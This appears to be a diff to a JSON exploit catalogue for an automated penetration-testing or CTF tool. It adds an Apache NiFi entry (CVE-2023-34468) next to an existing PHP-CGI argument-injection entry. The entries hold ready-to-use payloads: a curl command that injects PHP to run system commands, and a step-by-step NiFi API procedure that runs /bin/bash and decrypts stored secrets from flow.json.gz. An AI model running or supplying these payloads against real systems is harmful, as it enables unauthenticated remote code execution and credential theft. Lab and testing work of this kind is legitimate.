@@ -378,6 +378,17 @@
    "name": "PHP-CGI argument injection RCE (Windows)",
    "exploit": "curl -s 'http://{TARGET}:{PORT}/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input' --data '<?php system(\"whoami\"); ?>'",
    "note": "Windows PHP-CGI (XAMPP) soft-hyphen 0xAD argument injection -> arbitrary PHP. Only Windows/CGI SAPI."
+  },
+  {
+   "match": [
+    "nifi"
+   ],
+   "range": "",
+   "cve": "CVE-2023-34468",
+   "severity": "critical",
+   "name": "Apache NiFi unauthenticated API -> RCE",
+   "exploit": "curl -s http://{TARGET}:{PORT}/nifi-api/access/config   # supportsLogin:false == NO AUTH -> full API. Then create an ExecuteProcess processor (POST /nifi-api/process-groups/root/processors, type org.apache.nifi.processors.standard.ExecuteProcess) with Command=/bin/bash, Command Arguments='-c;<cmd>' (Argument Delimiter ';'), connect success->funnel, run once, read stdout from the queued flowfile (GET /nifi-api/flowfile-queues/{conn}/flowfiles/{uuid}/content). CVE-2023-34468: a DBCPConnectionPool with an H2 JDBC URL also yields RCE. Decrypt flow.json.gz enc{} secrets with the nifi.sensitive.props.key (static salt 'NiFi Static Salt', PBKDF2-HMAC-SHA512 x160000, AES-GCM).",
+   "note": "Check /nifi-api/flow/about for the version and /nifi-api/access/config for supportsLogin. If login is unsupported the whole REST API is unauthenticated: ExecuteProcess = command execution as the nifi user; sensitive DBCP passwords in flow.json.gz are recoverable with the sensitive props key. (HTB Helix.)"
   }
  ]
 }
